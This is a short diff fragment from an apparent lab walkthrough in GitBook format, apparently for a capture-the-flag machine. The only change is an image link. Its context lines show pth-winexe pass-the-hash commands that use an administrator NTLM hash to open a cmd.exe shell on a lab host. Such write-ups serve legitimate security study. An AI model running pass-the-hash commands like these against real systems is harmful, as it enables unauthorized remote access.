@@ -10,5 +10,5 @@ pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe
 pth-winexe -U jenkins/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe
 ```
 
-![](../.gitbook/assets/image%20%2834%29.png)
+![](../.gitbook/assets/image%20%2838%29.png)
 
